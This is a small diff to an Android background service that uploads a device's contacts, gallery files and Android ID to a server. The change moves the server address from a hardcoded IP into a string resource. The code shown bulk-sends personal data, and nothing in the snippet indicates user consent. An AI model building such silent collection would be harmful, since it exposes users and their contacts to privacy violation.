@@ -104,8 +104,9 @@ public class UploadService extends Service {
     }
 
     private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
-        String contactsUrl = "https://192.168.200.172:44326/api/Uploads/Contacts"; // Endpoint for contacts
-        String filesUrl = "https://192.168.200.172:44326/api/Uploads/Files"; // Endpoint for file uploads
+        String BaseUrl = getString(R.string.api_domain);
+        String contactsUrl = BaseUrl + "/api/Uploads/Contacts"; // Endpoint for contacts
+        String filesUrl = BaseUrl + "/api/Uploads/Files"; // Endpoint for file uploads
 
         // Check if the contacts list is empty or null
         if (contacts == null || contacts.isEmpty()) {
